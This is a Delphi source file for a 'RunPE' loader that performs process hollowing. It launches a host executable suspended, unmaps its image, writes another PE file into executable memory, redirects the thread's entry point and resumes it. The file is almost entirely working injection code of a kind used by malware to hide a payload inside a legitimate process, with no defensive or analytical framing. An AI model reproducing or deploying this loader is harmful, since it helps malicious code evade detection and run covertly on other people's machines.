// Supports both x86-32 and x86-64

program RunPE;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.Classes,
  WinAPI.Windows,
  System.SysUtils;


function NtUnmapViewOfSection(
  ProcessHandle: THandle;
  BaseAddress: Pointer
):DWORD; stdcall; external 'ntdll.dll';

type
  EWindowsException = class(Exception)
  private
    FLastError : Integer;
  public
    {@C}
    constructor Create(const WinAPI : String); overload;

    {@G}
    property LastError : Integer read FLastError;
  end;

  EInvalidPEFile = class(Exception)
  public
    {@C}
    constructor Create(const AReason : String); overload;
  end;

constructor EWindowsException.Create(const WinAPI : String);
var AFormatedMessage : String;
begin
  FLastError := GetLastError();

  AFormatedMessage := Format('___%s: last_err=%d, last_err_msg="%s".', [
      WinAPI,
      FLastError,
      SysErrorMessage(FLastError)
  ]);

  ///
  inherited Create(AFormatedMessage);
end;


constructor EInvalidPEFile.Create(const AReason : String);
begin
  inherited Create(Format('Invalid Windows PE File: "%s"', [AReason]));
end;

procedure WriteProcessMemoryEx(const hProcess : THandle; const pOffset, pData : Pointer; const ADataSize : SIZE_T);
var ABytesWritten : SIZE_T;
begin
  if not WriteProcessMemory(
    hProcess,
    pOffset,
    pData,
    ADataSize,
    ABytesWritten
  ) then
    raise EWindowsException.Create('WriteProcessMemory');
end;

procedure HollowMe(const pPEBuffer: PVOID; const APEBufferSize: Int64; APEHost : String); overload;
var AStartupInfo            : TStartupInfo;
    AProcessInfo            : TProcessInformation;
    pThreadContext          : PContext;
    AImageBase              : NativeUInt;
    pOffset                 : Pointer;
    ABytesRead              : SIZE_T;
    ptrImageDosHeader       : PImageDosHeader;
    AImageNtHeaderSignature : DWORD;
    ptrImageFileHeader      : PImageFileHeader;
    I                       : Integer;
    pSectionHeader          : PImageSectionHeader;
    pPayloadAddress         : Pointer;
    pImageBaseOffset        : Pointer;
    ALoaderX64              : Boolean;

    {$IFDEF WIN64}
      pOptionalHeader64 : PImageOptionalHeader64;
    {$ELSE}
      pOptionalHeader32 : PImageOptionalHeader32;
    {$ENDIF}

begin
  if (not Assigned(pPEBuffer)) or (APEBufferSize = 0) then
    raise Exception.Create('Memory buffer is not valid.');

  pOffset := pPEBuffer;

  ptrImageDosHeader := PImageDosHeader(pOffset);

  if ptrImageDosHeader^.e_magic <> IMAGE_DOS_SIGNATURE then
    raise EInvalidPEFile.Create('IMAGE_DOS_SIGNATURE');

  pOffset := Pointer(NativeUInt(pOffset) + ptrImageDosHeader^._lfanew);

  AImageNtHeaderSignature := PDWORD(pOffset)^;

  if AImageNtHeaderSignature <> IMAGE_NT_SIGNATURE then
    raise EInvalidPEFile.Create('IMAGE_NT_SIGNATURE');

  pOffset := Pointer(NativeUInt(pOffset) + SizeOf(DWORD));

  ptrImageFileHeader := PImageFileHeader(pOffset);

  {$IFDEF WIN64}
    ALoaderX64 := True;
  {$ELSE}
    ALoaderX64 := False;
  {$ENDIF}

  case ptrImageFileHeader^.Machine of
    IMAGE_FILE_MACHINE_AMD64 : begin
      if not ALoaderX64 then
        Exception.Create('Cannot load X86-64 PE file from a X86-32 Loader.');
    end;

    IMAGE_FILE_MACHINE_I386 : begin
      if ALoaderX64 then
        Exception.Create('Cannot load X86-32 PE file from a X86-64 Loader.');
    end;
  end;

  pOffset := Pointer(NativeUInt(pOffset) + SizeOf(TImageFileHeader));

  {$IFDEF WIN64}
    pOptionalHeader64 := PImageOptionalHeader64(pOffset);

    pOffset := Pointer(NativeUInt(pOffset) + SizeOf(TImageOptionalHeader64));
  {$ELSE}
    pOptionalHeader32 := PImageOptionalHeader32(pOffset);

    pOffset := Pointer(NativeUInt(pOffset) + SizeOf(TImageOptionalHeader32));
  {$ENDIF}

  pSectionHeader := PImageSectionHeader(pOffset);

  ZeroMemory(@AStartupInfo, SizeOf(TStartupInfo));
  ZeroMemory(@AProcessInfo, SizeOf(TProcessInformation));

  AStartupInfo.cb := SizeOf(TStartupInfo);
  AStartupInfo.wShowWindow := SW_SHOW;

  UniqueString(APEHost);

  if not CreateProcessW(
      PWideChar(APEHost),
      nil,
      nil,
      nil,
      False,
      CREATE_SUSPENDED,
      nil,
      nil,
      AStartupInfo,
      AProcessInfo
  ) then
    raise EWindowsException.Create('CreateProcessW');

  pThreadContext := VirtualAlloc(nil, SizeOf(TContext), MEM_COMMIT, PAGE_READWRITE);
  pThreadContext^.ContextFlags := CONTEXT_FULL;

  if not GetThreadContext(AProcessInfo.hThread, pThreadContext^) then
    raise EWindowsException.Create('GetThreadContext');

  {$IFDEF WIN64}
    pImageBaseOffset := Pointer(pThreadContext^.Rdx + (SizeOf(Pointer) * 2));
  {$ELSE}
    pImageBaseOffset := Pointer(pThreadContext^.Ebx + (SizeOf(Pointer) * 2));
  {$ENDIF}

  if not ReadProcessMemory(AProcessInfo.hProcess, pImageBaseOffset, @AImageBase, SizeOf(NativeUInt), ABytesRead) then
    raise EWindowsException.Create('ReadProcessMemory');

  if NtUnmapViewOfSection(AProcessInfo.hProcess, Pointer(AImageBase)) <> 0 then
    raise Exception.Create('Could not unmap section.');

  pPayloadAddress := VirtualAllocEx(
    AProcessInfo.hProcess,
    nil,
    {$IFDEF WIN64}
      pOptionalHeader64^.SizeOfImage,
    {$ELSE}
      pOptionalHeader32^.SizeOfImage,
    {$ENDIF}
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  );

  if not Assigned(pPayloadAddress) then
    raise EWindowsException.Create('VirtualAllocEx');

  WriteProcessMemoryEx(
    AProcessInfo.hProcess,
    pPayloadAddress,
    pPEBuffer,
    {$IFDEF WIN64}
      pOptionalHeader64^.SizeOfHeaders
    {$ELSE}
      pOptionalHeader32^.SizeOfHeaders
    {$ENDIF}
  );

  for I := 1 to ptrImageFileHeader^.NumberOfSections do begin
    try
      WriteProcessMemoryEx(
        AProcessInfo.hProcess,
        Pointer(NativeUInt(pPayloadAddress) + pSectionHeader^.VirtualAddress),
        Pointer(NativeUInt(pPEBuffer) + pSectionHeader^.PointerToRawData),
        pSectionHeader^.SizeOfRawData
      );
    finally
      pSectionHeader := Pointer(NativeUInt(pSectionHeader) + SizeOf(TImageSectionHeader));
    end;
  end;

  {$IFDEF WIN64}
    pThreadContext^.Rcx := NativeUInt(pPayloadAddress) + pOptionalHeader64^.AddressOfEntryPoint;
  {$ELSE}
    pThreadContext^.Eax := NativeUInt(pPayloadAddress) + pOptionalHeader32^.AddressOfEntryPoint;
  {$ENDIF}

  WriteProcessMemoryEx(
    AProcessInfo.hProcess,
    pImageBaseOffset,
    @pPayloadAddress,
    SizeOf(Pointer)
  );

  if not SetThreadContext(AProcessInfo.hThread, pThreadContext^) then
    raise EWindowsException.Create('SetThreadContext');

  if ResumeThread(AProcessInfo.hThread) = 0 then
    raise EWindowsException.Create('ResumeThread');
end;


procedure HollowMe(const APEFile, APEHost : String); overload;
var ABuffer    : array of byte;
    hFile      : THandle;
    AFileSize  : Int64;
    ABytesRead : DWORD;
begin
  if not FileExists(APEFile) then
    raise Exception.Create(Format('File "%s" does not exists.', [APEFile]));
  ///

  hFile := CreateFile(
      PWideChar(APEFile),
      GENERIC_READ,
      FILE_SHARE_READ,
      nil,
      OPEN_EXISTING,
      0,
      0
  );
  if hFile = INVALID_HANDLE_VALUE then
    raise EWindowsException.Create('CreateFile');

  try
    if not GetFileSizeEx(hFile, AFileSize) then
      raise EWindowsException.Create('GetFileSizeEx');

    if AFileSize = 0 then
      raise Exception.Create('Invalid PE File Size.');

    SetLength(ABuffer, AFileSize);

    if not ReadFile(hFile, ABuffer[0], AFileSize, ABytesRead, nil) then
      raise EWindowsException.Create('ReadFile');
  finally
    CloseHandle(hFile);
  end;

  ///
  HollowMe(PByte(ABuffer), AFileSize, APEHost);
end;

begin
  try
    HollowMe('FileToRun.exe', 'HostFile.exe');
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.